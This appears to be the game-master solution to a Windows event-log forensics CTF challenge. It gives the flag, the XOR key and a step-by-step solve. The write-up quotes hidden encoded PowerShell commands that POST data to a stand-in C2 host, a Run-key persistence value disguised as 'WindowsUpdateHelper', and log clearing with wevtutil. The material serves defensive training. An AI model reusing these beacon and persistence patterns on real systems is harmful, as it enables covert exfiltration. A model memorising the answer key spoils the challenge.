# Houston, We Have a Problem — Solution (GM-only)

> **Rework complete (options 1+3, addresses PR #69 review).** The `dist/*.evtx` were
> regenerated on the build VM so the `-enc` payloads no longer contain the flag in
> cleartext: the beacon carries the flag **XOR-encrypted** and the persistence value
> carries the **key**, so neither blob alone yields the flag and the correlation is the
> puzzle. Three benign `-enc` decoys were added to the noise. The `-enc` shortcut is
> narrower, not gone: see "`-enc` shortcut: narrowed, not closed" below.

Verified against the shipped `dist/*.evtx`: a raw byte scan finds no `flag{` (ASCII or
UTF-16LE) in any of the three logs; decoding the beacon `-enc` yields only base64
ciphertext and decoding the persistence `-enc` yields only the key (neither contains
`flag{`); and `base64-decode(ciphertext) XOR key` reproduces the flag exactly.

Re-verified 2026-11-05 on the same `dist/` files: `solution/solve.ps1` recovers the exact flag
from `dist/` alone, and every base64-looking token in all three logs, decoded as UTF-16LE and
as UTF-8 and one level deeper, contains no copy of the flag.

**Flag:** `flag{gr0und_c0ntr0l_t0_m4j0r_1ntrus10n}`

**Encryption:** repeating-key XOR, key `H0UST0N_TR4NQU1L1TY_B4S3` (stored in the persistence
Run value), ciphertext base64-encoded. CyberChef: `From Base64` → `XOR` (UTF8 key).

## Attack chain summary

What the shipped logs show, in order (UTC, 2026-11-04 into 11-05):

1. **Initial access**: two genuine Type 10 (RemoteInteractive/RDP) logons as `chrisRK` from
   `10.0.2.2`, Security Event 4624 at 23:22:01 and 00:28:11. Each session logs off (4647)
   within half a minute and runs only session-start processes.
2. **Persistence**: at 00:42:35 a `-enc` command is written to the `chrisRK` Run value
   `WindowsUpdateHelper`, captured as Sysmon Event 13. Its decoded body carries the
   **XOR key** (POSTed to a `/gate` endpoint) and is **required** to decrypt the beacon
   ciphertext. `vboxuser` wrote it through an offline hive load (see the tells below).
3. **Execution**: at 00:44:10 a base64-encoded (`-enc`) PowerShell command runs as `chrisRK`,
   captured as Sysmon Event 1 and as PowerShell-Operational Event 4100. The decoded script
   POSTs the **XOR-encrypted flag (base64 ciphertext)** to a fake C2 beacon. The flag is NOT
   present in cleartext. It runs in a separate Type 2 logon that `vboxuser` started with
   `chrisRK`'s credentials (Security 4648, then 4624 at 00:44:02), not inside either RDP
   session.
4. **Noise**: routine `vboxuser` commands before and after the chain, including three benign
   `-enc` PowerShell one-liners, also run as `vboxuser`.

## Step-by-step solve path

### 1. Find the anomalous logon (`Security.evtx`)

```powershell
Get-WinEvent -Path Security.evtx -FilterXPath "*[System[EventID=4624]]" |
  Where-Object { $_.Message -match "Logon Type:\s*10" }
```

The Type 10 (RemoteInteractive/RDP) logons in the export are all Account Name `chrisRK`,
Source Network Address `10.0.2.2` (the attacker reconnecting). Everything else is Type
2/3/5 console and service noise.

### 2. Pivot to Sysmon Event 1 by account

```powershell
Get-WinEvent -Path Microsoft-Windows-Sysmon-Operational.evtx -FilterXPath "*[System[EventID=1]]" |
  Where-Object { $_.Properties[12].Value -match "chrisRK" }
```

The `chrisRK` list is short: session-start processes from the two RDP logons, a VirtualBox
guest-tools session left over from the build, the `update_check.ps1` launcher, and its child.
That child is the only `chrisRK` process with `-enc`, and it is the beacon. It runs about 16
minutes after the second RDP session logged off, so match on the account, not on a time near
the RDP logon. Its command line:

```
"...\powershell.exe" -nop -w hidden -enc JABjAD0AJwBMAGwAdwAwAE4AQwA5AFgAUABHADgAaABQAEYAQQBSAE0AbQBWAGYATwBFAE4AawBOAFEAQQAyAEIAQQB4AGUAZgBGAHAAbABJAFEAcwBCAEkAQwBzAG0ASgAwAGQALwBZAFQAdABNACcAOwAgAGkAdwByACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGIAZQBhAGMAbwBuACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEIAbwBkAHkAIAAkAGMA
```

### 3. Decode the beacon blob (UTF-16LE)

`-EncodedCommand` is always UTF-16LE. A naive UTF-8 decode produces null-interleaved garbage;
competitors have to know/discover the UTF-16LE requirement.

```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))
```

Decoded:

```
$c='Llw0NC9XPG8hPFARMmVfOENkNQA2BAxefFplIQsBICsmJ0d/YTtM'; iwr -Uri http://198.51.100.23/beacon -Method POST -Body $c
```

This is the **skill gate that used to end the challenge** — but `$c` is now base64 ciphertext,
not the flag. Decoding it alone does not solve the challenge.

### 4. Recover the key from persistence (Sysmon Event 13)

```powershell
Get-WinEvent -Path Microsoft-Windows-Sysmon-Operational.evtx -FilterXPath "*[System[EventID=13]]" |
  Where-Object { $_.Message -match "WindowsUpdateHelper" }
```

- `TargetObject`: `HKU\ChrisRKTemp\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper`
- `Details`: `powershell.exe -nop -w hidden -enc <blob>`, where `<blob>` decodes (UTF-16LE) to:

```
$k='H0UST0N_TR4NQU1L1TY_B4S3'; iwr -Uri http://198.51.100.23/gate -Method POST -Body $k
```

Persistence `-enc` blob (deterministic target):

```
JABrAD0AJwBIADAAVQBTAFQAMABOAF8AVABSADQATgBRAFUAMQBMADEAVABZAF8AQgA0AFMAMwAnADsAIABpAHcAcgAgAC0AVQByAGkAIABoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgAyADMALwBnAGEAdABlACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEIAbwBkAHkAIAAkAGsA
```

The intrusion tie-ins are unchanged: one IP's Run-key persistence, the `WindowsUpdateHelper`
value name, and the attacker account `chrisRK` (plus the known offline-hive cosmetic tells
in the section below).

### 5. Decrypt — ciphertext XOR key

Base64-decode `$c`, XOR against the key `H0UST0N_TR4NQU1L1TY_B4S3` (repeating), decode ASCII:

```powershell
$ct = [Convert]::FromBase64String('Llw0NC9XPG8hPFARMmVfOENkNQA2BAxefFplIQsBICsmJ0d/YTtM')
$kb = [System.Text.Encoding]::ASCII.GetBytes('H0UST0N_TR4NQU1L1TY_B4S3')
-join (0..($ct.Length-1) | ForEach-Object { [char]($ct[$_] -bxor $kb[$_ % $kb.Length]) })
```

→ `flag{gr0und_c0ntr0l_t0_m4j0r_1ntrus10n}`

CyberChef equivalent: `From Base64` → `XOR` with key `H0UST0N_TR4NQU1L1TY_B4S3` (UTF8).

## Known tells in the logs (accepted as-is)

Persistence:

- `TargetObject` shows the offline-hive mount alias `HKU\ChrisRKTemp\...` rather than
  chrisRK's real SID (artifact of writing persistence via an offline `reg load`).
- The event's `User` field may show `WINDOWS\vboxuser`, not `chrisRK` — same root cause.
  Tie the event to the intrusion via the matching `WindowsUpdateHelper` value name, not the
  `User` field.

Build harness, visible to players. There was no time to rebuild the VM before the 2026 event,
and none of these contain or lead to the flag:

- All three channels are cleared with `wevtutil cl` at the start (Sysmon Event 1, plus
  Security Event 1102), and `export_logs.ps1` runs at the end.
- The noise generator runs under its real name, `C:\Temp\houston\generate_noise.ps1 -Count 55`,
  in Sysmon Event 1 and PowerShell-Operational Event 4104. Its renamed copy
  `C:\Users\Public\Documents\inventory.ps1` is the parent of the noise processes.
- VirtualBox guest-tools sessions (`VBoxService.exe guestsession`) run build commands,
  including `cmd.exe ... "echo CHRIS_GC_OK"` as `chrisRK`.
- PowerShell-Operational Event 4104 holds the launcher that starts `update_check.ps1` as
  `chrisRK` with `Start-Process -Credential`, including that lab account's password in
  plaintext. The persistence script `set_persist.ps1` also appears by name.
- Four Type 3 logons from `10.0.2.2` carry WorkstationName `CTRL-FLOWTOP`, the build host
  that ran the RDP client.

A later cleanup doesn't need the VM: `wevtutil epl <in.evtx> <out.evtx> /lf:true /q:"<XPath>"`
exports a filtered copy without chosen records. It leaves gaps in EventRecordID.

## `-enc` shortcut: narrowed, not closed

The previous build embedded the cleartext flag in the beacon payload (and duplicated it in
the persistence value), so a single UTF-16LE base64 decode of either `-enc` blob won the
challenge — the `-enc` grep → decode shortcut PR #69 flagged. In this rework:

- Decoding the **beacon** `-enc` yields only base64 **ciphertext**.
- Decoding the **persistence** `-enc` yields only the **key**.
- A search of the parsed logs for `-enc` returns six hits: the beacon twice (Sysmon Event 1
  and PowerShell-Operational Event 4100), the key once (Sysmon Event 13), and three benign
  one-liners (`Get-ChildItem Env:` once, `$PSVersionTable` twice). The benign ones carry no
  flags.
- The beacon and key bodies both POST to `198.51.100.23` and name their values `$c` and `$k`,
  so a player who decodes every hit can XOR the pair without touching `Security.evtx`. The
  rework added the XOR step to that path; it did not remove the path. The persistence step
  does now have a real reason to exist in the solve.

The tag stays **hard** (author's call). Scoring is uniform dynamic, so the tag is only a
label; **medium** is a fair read of the shortcut path.

> Note: the old "red herring" justification — that grepping `PowerShell-Operational` 4104
> events for `flag{`/`beacon` returned zero matches — was stale and misleading (the payload
> was base64, so that literal search never could match while the `-enc` blob was right
> there). Script Block Logging stays disabled, but the challenge no longer leans on any
> single channel being a dead end; it leans on the ciphertext+key correlation.

## Notes for the CTFd import / verification

- `dist/*.evtx` were regenerated on the build VM and verified end-to-end: the beacon
  (Sysmon Event 1, `chrisRK`) decodes to ciphertext, the persistence (Sysmon Event 13,
  `WindowsUpdateHelper`) decodes to the key, and ciphertext XOR key reproduces the flag.
- Confirmed no `flag{` appears in any `.evtx` (raw ASCII and UTF-16LE byte scan on all
  three files), and no base64 or double-base64 copy of the flag either.
- `solution/solve.ps1` automates the solve from `dist/` alone on Windows (Windows PowerShell
  5.1 or PowerShell 7). It finds the RDP account, decodes that account's `-enc` process, picks
  the Run value that posts to the same C2 host, and prints ciphertext XOR key:
  `powershell -NoProfile -ExecutionPolicy Bypass -File solution\solve.ps1`
- Note: the Sysmon event *Message* only renders on a host that has the Sysmon provider
  manifest registered; on a bare analysis box, parse the `EventData` fields via
  `(Get-WinEvent ...).ToXml()` (CommandLine / TargetObject / Details) instead.
